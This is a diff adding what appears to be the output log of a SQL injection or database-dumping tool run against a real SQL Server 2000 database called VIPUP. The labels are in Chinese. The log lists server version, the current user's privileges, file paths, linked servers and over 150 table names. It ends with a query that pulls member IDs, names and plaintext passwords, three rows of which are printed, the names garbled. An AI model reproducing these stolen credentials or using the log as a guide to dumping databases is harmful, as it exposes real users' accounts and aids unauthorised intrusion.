@@ -1,0 +1,205 @@
+
+■数据库信息:============================================================
+- 数据库名：VIPUP
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：VIPUPDB
+- 服务名：MSSQLSERVER
+- 系统用户名：vipup
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+drmdb	D:\VIPUP_SQL_DATA\drmdb_Data.MDF	
+dyne	D:\VIPUP_SQL_DATA\dyne_Data.MDF	
+InGangIntranet	D:\VIPUP_SQL_DATA\InGangIntranet_Data.MDF	
+intranet	D:\VIPUP_SQL_DATA\intranet_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+newchatv1	D:\VIPUP_SQL_DATA\NewChatv1_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+VIPUP	D:\VIPUP_SQL_DATA\VIPUP.mdf	
+VIPUP_LOG	D:\VIPUP_SQL_DATA\VIPUP_LOG_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+VIPUPDB	SQL Server	SQLOLEDB	VIPUPDB		VIPUPDB	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [VIPUP] 的表名……
+一次性获取失败，正在批次获取……
+ xl
+V_CUST_QNA
+V_FAQ
+V_COMMENT
+V_NEWSMAIL_LOG
+V_MADANG
+V_MEMBER
+V_ADMIN_PAGE
+V_PAC_INFO
+V_MST_LOG
+V_FREE_LEC
+V_MST_NOTICE
+V_DIST_RATE
+V_POINT_RECOMM
+V_MY_MADANG
+V_NOTICE
+t_t
+V_ORDER
+V_CARRY_MONEY
+V_PRESS
+V_INFOMERCIAL_CLICK
+V_PAY_IN
+V_PAY_OUT
+V_POST
+V_QNA
+V_LEC_MINUTE
+V_RECOMM
+V_VIPUP_QNA
+V_FREE_LEC_COMMENT
+V_Sumnail
+V_MST_JOIN
+V_VOD_ERROR
+V_NHN_COUNTER
+V_BEST_LEC
+V_MEMBER_DEL
+V_MERCHANT_ID
+V_INFO_COMPANY
+V_ASP_ADMIN
+V_POINT_EXCHANGE
+V_INFO_CODE
+V_CART
+V_DIST_SETTLE
+V_NHN_LOG
+V_CART_PACKAGE
+V_OFF_ORDER
+V_MASTER_COMMENT
+V_MASTER_PLUS
+V_CR
+V_MASTER_POST
+V_INFO_ADMIN
+V_MASTER_QNA
+V_LEC_VIEW_LOG
+V_PACKAGE_BOARD
+V_EVENT
+onnet_event
+V_PRO_LOG
+V_ASP_LOG
+V_EVENT_POINT
+V_ADMIN
+V_CUPON_SERIAL
+MEDIA_PROTECT_EXE
+V_TEST_MEM
+V_INFOMERCIAL_PLAYCLICK
+V_CUPON
+V_MEMBER_EXTEND_DEL
+V_POINT_PACKAGE
+V_IDEA
+JK_MEM_TBL
+V_PRO
+dtproperties
+V_CUPON_USED
+V_LEC_MINUTE_V2
+V_ASP_IMAGE_LOGO
+V_POINT_LEC_MAIL
+V_MST
+V_ASP_ORDER
+V_LEC_PACKAGE
+V_PAN_LOG
+V_ASP_COUNTER
+V_ACADEMY_COMMENT
+V_URL_COUNTER
+V_PAN_COUNTER
+V_LEC_LOG
+V_ACADEMY_ERROR
+V_ACADEMY_ORDER
+V_CHAPTER
+ChanMailTest
+V_FIXED_ORDER
+V_GAMOK
+V_OK_OPEN_EVENT
+V_GANGEOU
+V_LEC_PACKAGE_COMMENT
+V_ASP_COMMENT
+V_LEC_PACKAGE_INFO
+V_LOGIN_LOG
+JCZ3Tmp
+V_LEC_PACKAGE_ORDER
+V_CATEGORY
+jbt_event
+V_OKCASHBAG_CARD_USE
+V_DAILY_FREE_LEC
+V_ASP_DIST_RATE
+V_POINT_PLUS
+V_MEMBER_EXTEND
+V_POINT_ACADEMY_COMMENT
+V_DAUM_FOR_SEARCH
+V_POINT_PACKAGE_COMMENT
+V_SENDMAIL
+V_LEC
+V_LINKPRICE_CHARGE
+V_POINT_QNA_RECOM
+V_ASP_DIST_SETTLE
+V_ASP_CODE
+V_FIXED_AMOUNT
+tblTOKENID
+V_POINT_CODE
+V_NEWSMAIL_DATA
+tblREPORT
+V_ASP_COMPANY
+V_POINT
+V_LINKPRICE_CHECK
+V_FIXED_AMOUNT_ASP
+V_AD_QNA
+V_POINT_LEC
+V_ARS
+V_LEC_PREVIEW_LOG
+V_NEWSMAIL
+V_POINT_LEC_P
+V_CLASS
+V_CODE
+V_COMMENT_REPLY
+V_JK_OPEN_EVENT
+V_POINT_FREE_LEC
+V_COUNTER
+V_CP_BOARD
+
+正在执行查询：select top 3 mem_id,mem_name,mem_pwd,mem_email from VIPUP..V_MEMBER order by mem_email
+baeoom	硅框村哪	bae1012		
+bodyart	冠固沥	mj3071218		
+bodyart	冠固沥	mj3071218		
